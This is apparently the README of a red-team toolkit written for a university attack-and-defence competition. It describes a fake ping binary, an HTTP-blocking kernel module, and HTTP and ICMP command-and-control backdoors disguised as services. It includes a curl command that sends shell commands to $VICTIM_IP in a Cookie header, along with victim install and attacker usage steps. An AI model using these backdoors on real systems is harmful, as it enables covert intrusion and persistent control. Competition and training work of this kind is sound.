# Red Team Tools

Each of the tools below was developed by Jack Dunfey for the Internal Lockdown competition at the University at Buffalo.

Each of their folders has an individual README with more information 

## Everything!

```
git clone ...
cd Red-Team-Tools
chmod +x install.sh
./install.sh all
```

## Malicious Ping

This is a C program that can be compiled to replace the ping binary on a system.
It will seem successful for any properly formed IP address or valid DNS name.

<!-- Add images here -->

## HTTP Takedown Kernel Module

This is a kernel module that when installed will block HTTP requests for X minutes every Y minutes. X and Y can be set using macros at the top of the file.

## HTTP C2

Creates a service called processd that runs a program that listens for commands hidden in the headers of an HTTP request

Example Attack:
`curl $VICTIM_IP -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" -H "Cookie: $CMD" -H "Upgrade-Insecure-Requests: $RETURN_PORT" > /dev/null 2>&1`

## ICMP C2

Creates a service called icmp that "replaces" the kernels responses to icmp echo requests with its own. It will respect the contents of the `net.ipv4.icmp_echo_ignore_all`.

If IP packet has a ttl of 45, 65, 31, or 17, the service will execute the payload and the response will be the output of the command.

<!-- TODO: 
- Should make the code timeout and send decoy response to avoid suspicion -->

Multithreading and restart on failure added for persistence.

For victim:
git clone then run `sudo ./install.sh` from within icmp-c2 directory
Once installed, source directory can be deleted 

For attacker:
run `python3 send-command.py ls -l`, can replace with any command

To force a reply even if ignore echo rule is turned on, use the `-f` flag as `argv[1]`
